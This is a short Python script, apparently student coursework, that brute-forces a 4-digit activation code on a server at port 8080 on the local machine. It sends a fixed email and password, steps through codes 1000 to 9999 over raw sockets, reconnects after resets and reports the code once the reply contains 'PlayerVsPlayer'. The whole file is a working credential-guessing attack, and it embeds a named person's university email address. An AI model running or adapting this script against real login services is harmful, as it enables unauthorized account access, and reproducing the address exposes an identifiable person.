import socket
import time
from tqdm import tqdm

class brute_force:

    @staticmethod
    def send(s, message):
        s.sendall(message)

    @staticmethod
    def run():

        host = socket.gethostbyname(socket.gethostname())
        port = 8080
        count = 1000
        max_count = 9999
        success = False
        output = tqdm(total=max_count - count)
        start = time.time()

        while not success:

            try:

                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.recv(1024)

                    while count != max_count:

                        output.update()

                        brute_force.send(s, b"1\r\n")

                        s.recv(1024)
                        brute_force.send(s, b"florian.hagengruber@stud.th-deg.de\r\n")
                        s.recv(1024)
                        brute_force.send(s, b"aPassword\r\n")
                        s.recv(1024)
                        code = str(count) + "\r\n"
                        brute_force.send(s, code.encode())

                        time.sleep(0.02)

                        data = s.recv(1024)

                        if "PlayerVsPlayer" not in data.decode():
                            count += 1
                            continue
                        else:
                            output.close()
                            print("Login successful")
                            print("Activation Code: " + str(count))
                            print("Time needed: " + str(time.time() - start) + " seconds")
                            success = True
                            break

            except ConnectionResetError:
                s.close()
                continue
            except ConnectionAbortedError:
                s.close()
                continue

if __name__ == "__main__":
    brute_force.run()
